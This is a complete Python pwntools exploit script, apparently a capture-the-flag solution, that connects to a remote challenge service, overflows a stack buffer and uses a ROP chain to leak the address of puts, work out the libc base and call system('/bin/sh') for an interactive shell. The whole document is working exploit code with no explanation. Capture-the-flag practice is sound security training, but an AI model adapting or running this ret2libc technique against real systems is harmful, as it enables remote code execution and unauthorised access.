from  pwn import *

binary = ELF("./chall")
libc = ELF("libc_2")

local = False
if local:
    # p = process("./chall", env={"LD_PRELOAD": "./libc.so.6"})
    p = process("./chall")
    input("gdb")
else:
    p = remote("tjc.tf", 31705)


m = p.recvuntil(b"today?\n")

ret_addr = 0x00000000004011a8
pop_rdi = 0x0000000000401243
vacation_addr = 0x0000000000401176

payload = cyclic(500)
payload = payload[:cyclic_find("gaaa")] + p64(pop_rdi) + p64(binary.got['puts']) + p64(binary.plt['puts']) + p64(vacation_addr)
p.sendline(payload)

m = p.recvuntil(b"today?\n")
leak = m.split(b"\n")[0] + b"\x00\x00"
puts_leak = u64(leak)
libc.address = puts_leak - libc.sym['puts']

log.info("Puts addr: {}".format(hex(puts_leak)))
log.info("Libc leaked: {}".format(hex(libc.address)))

bin_sh_addr = next(libc.search(b"/bin/sh"))

payload = cyclic(500)
payload = payload[:cyclic_find("gaaa")] + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh_addr) + p64(libc.sym["system"])
p.sendline(payload)

p.interactive()
